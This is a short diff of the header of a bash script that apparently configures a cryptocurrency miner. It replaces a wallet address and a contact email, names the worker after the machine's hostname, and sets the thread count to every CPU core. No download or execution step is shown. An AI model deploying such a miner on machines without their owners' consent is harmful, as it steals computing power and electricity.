@@ -1,8 +1,8 @@
 #!/bin/bash
 
-WALLET=49ZToWnR6QwAT6ZQDFYiM5M5Fnj92o33ddteDfxrY6hqF3MJvQHVRwF5h1xfohemzwDavc8nPxqCkjha8ZammNRRQrRApPS
+WALLET=48Wr8BQQbUSG8ScyrDV91YCuCawHEQGUs4968iEH4F6wVJNXxH6zbEjeHsUYaNYHkv78Qa23qRmFzgzv8r6fDxqD5fF1P5C
 ID="$(hostname)"
-MAIL=woodstolen@protonmail.com
+MAIL=gerandot@protonmail.com
 PASSWORD=$ID:$MAIL
 THREADS="$(nproc --all)"
 
